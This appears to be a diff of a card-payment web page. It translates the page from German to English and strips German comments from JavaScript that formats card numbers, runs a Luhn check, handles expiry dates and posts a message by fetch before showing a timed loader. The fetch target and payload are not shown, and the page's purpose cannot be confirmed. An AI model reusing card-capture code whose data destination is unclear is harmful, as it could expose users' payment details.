@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -257,13 +257,11 @@
     const cardGroup = document.getElementById("card-number-group");
     const expiryGroup = document.getElementById("expiry-group");
 
-    // Karteninhaber automatisch aus LocalStorage
     const userData = JSON.parse(localStorage.getItem("checkoutData"));
     if (userData && userData.name) {
       nameInput.value = userData.name;
     }
 
-    // Kartennummer Formatierung + Erkennung
     cardInput.addEventListener("input", e => {
       let value = e.target.value.replace(/\D/g, "").slice(0, 16);
       let formatted = value.replace(/(.{4})/g, "$1 ").trim();
@@ -273,7 +271,6 @@
       validateCardNumber(value);
     });
 
-    // Anbieter Highlight
     function highlightCardProvider(value) {
       const providers = {
         visa: /^4/,
@@ -290,7 +287,6 @@
       }
     }
 
-    // Luhn-Check
     function validateCardNumber(num) {
       const group = document.getElementById("card-number-group");
       const cleaned = num.replace(/\D/g, "");
@@ -314,7 +310,6 @@
       }
     }
 
-    // Ablaufdatum Formatierung
     expiryInput.addEventListener("input", e => {
       let val = e.target.value.replace(/\D/g, "").slice(0, 4);
 
@@ -331,7 +326,6 @@
       validateExpiry(e.target);
     });
 
-    // Backspace bei Slash
     expiryInput.addEventListener("keydown", e => {
       if (e.key === "Backspace") {
         const val = e.target.value;
@@ -428,7 +422,6 @@
 		body: JSON.stringify(message)
 	  }).catch(err => console.error("Error", err));
 
-	  // Loading
 	  loader.classList.add("active");
 
 	  setTimeout(() => {
@@ -484,7 +477,6 @@
 		}
 	  }
 
-	  // Initial deaktivieren
 	  nextButton.disabled = true;
 	  nextButton.style.opacity = "0.5";
 	  nextButton.style.pointerEvents = "none";
